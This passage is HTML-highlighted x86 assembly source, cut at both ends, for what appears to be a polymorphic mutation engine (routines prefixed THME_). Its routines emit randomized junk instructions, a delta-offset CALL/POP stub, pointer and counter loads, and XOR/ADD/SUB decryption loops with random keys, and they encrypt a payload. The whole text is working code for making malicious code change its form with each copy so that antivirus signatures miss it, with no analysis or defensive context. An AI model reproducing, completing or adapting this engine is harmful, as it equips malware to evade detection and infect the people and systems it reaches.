    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">                 </span><span class="sc1">; RET</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                         </span><span class="sc1">; ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; @@2:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">       

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc5">THME_CryptData</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; Encrypt given data with proper operation</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Data2crypt</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_S2C_div4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">THME_CD_EncryptLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_DoCryptOperations</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">THME_CD_EncryptLoop</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_DoCryptOperations</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CryptOp</span><span class="sc4">],</span><span class="sc5">_XOR</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_DCO_XOR</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CryptOp</span><span class="sc4">],</span><span class="sc5">_ADD</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_DCO_ADD</span><span class="sc0">
</span><span class="sc5">THME_DCO_SUB</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Key1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_DCO_EXIT</span><span class="sc0">
</span><span class="sc5">THME_DCO_ADD</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Key1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_DCO_EXIT</span><span class="sc0">
</span><span class="sc5">THME_DCO_XOR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Key1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">THME_DCO_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---</span><span class="sc0">

</span><span class="sc5">THME_GenDeltaOffset</span><span class="sc4">:</span><span class="sc0">                            </span><span class="sc1">; CALL @@1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                         </span><span class="sc1">; ...</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">                         </span><span class="sc1">; @@1:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; POP E??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_GDO_TmpCll</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_GDO_TmpCll</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_DeltaReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Pointer</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Fix1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GenLoadSize</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GLS_@@2</span><span class="sc0">
</span><span class="sc5">THME_GLS_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">68h</span><span class="sc0">                          </span><span class="sc1">; PUSH ????????</span><span class="sc0">
                        </span><span class="sc1">; ...</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">; POP E??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_S2C_div4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GenGarbage</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">58h</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CounterReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">THME_GLS_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CounterReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">                        </span><span class="sc1">; MOV E??,????????</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_S2C_div4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GenLoadPointer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8Dh</span><span class="sc0">                          </span><span class="sc1">; LEA E??,[E??+????????]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_PointerReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_DeltaReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">LIMIT</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Fix1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_StoreLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_LoopAddress</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GenCryptOperations</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CryptOp</span><span class="sc4">],</span><span class="sc5">_XOR</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GCO_XOR</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_CryptOp</span><span class="sc4">],</span><span class="sc5">_ADD</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">THME_GCO_ADD</span><span class="sc0">
</span><span class="sc5">THME_GCO_SUB</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                          </span><span class="sc1">; SUB [E??],????????</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GCO_BuildRiB</span><span class="sc0">
</span><span class="sc5">THME_GCO_ADD</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; ADD [E??],????????</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GCO_BuildRiB</span><span class="sc0">
</span><span class="sc5">THME_GCO_XOR</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">                          </span><span class="sc1">; XOR [E??],????????</span><span class="sc0">
</span><span class="sc5">THME_GCO_BuildRiB</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_PointerReg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_PointerReg</span><span class="sc4">],</span><span class="sc5">_EBP</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">THME_GCO_BR_NoEBP</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01000000b</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">THME_GCO_BR_NoEBP</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">random</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">THME_Key1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">THME_GCO_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GenIncPointer</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GIP_@@2</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GIP_@@3</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GIP_@@4</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">THME_GIP_@@1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_@@5</span><span class="sc0">

</span><span class="sc5">THME_GIP_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">; ADD E??,4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_AddIt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_EXIT</span><span class="sc0">

</span><span class="sc5">THME_GIP_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GIP_@@2_@@2</span><span class="sc0">
</span><span class="sc5">THME_GIP_@@2_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; ADD E??,3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_AddIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_IncIt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_@@2_EXIT</span><span class="sc0">
</span><span class="sc5">THME_GIP_@@2_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_IncIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_AddIt</span><span class="sc0">                  </span><span class="sc1">; ADD E??,3</span><span class="sc0">
</span><span class="sc5">THME_GIP_@@2_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_EXIT</span><span class="sc0">

</span><span class="sc5">THME_GIP_@@3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GIP_@@3_@@2</span><span class="sc0">
</span><span class="sc5">THME_GIP_@@3_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; ADD E??,2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_AddIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_IncIt</span><span class="sc0">                  </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_@@2_EXIT</span><span class="sc0">
</span><span class="sc5">THME_GIP_@@3_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_IncIt</span><span class="sc0">                  </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; ADD E??,2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_AddIt</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_@@2_EXIT</span><span class="sc0">

</span><span class="sc5">THME_GIP_@@4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">r_range</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">THME_GIP_@@4_@@2</span><span class="sc0">
</span><span class="sc5">THME_GIP_@@4_@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; ADD E??,1</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_AddIt</span><span class="sc0">                  </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_IncIt</span><span class="sc0">                  </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_@@2_EXIT</span><span class="sc0">
</span><span class="sc5">THME_GIP_@@4_@@2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_IncIt</span><span class="sc0">                  </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_AddIt</span><span class="sc0">                  </span><span class="sc1">; ADD E??,1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">THME_GIP_@@2_EXIT</span><span class="sc0">

</span><span class="sc5">THME_GIP_@@5</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">; INC E??</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">THME_GIP_IncIt</span><span class="sc0">                  </span><span class="sc1">; INC E??</span><span class="sc0">
                        </span><span class="sc1">; INC E??</span><span class="sc0">

</span><span class="sc5">THME_GIP_EXIT</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">THME_GIP_AddIt</span><span class="sc4">:</span><span class="sc0">
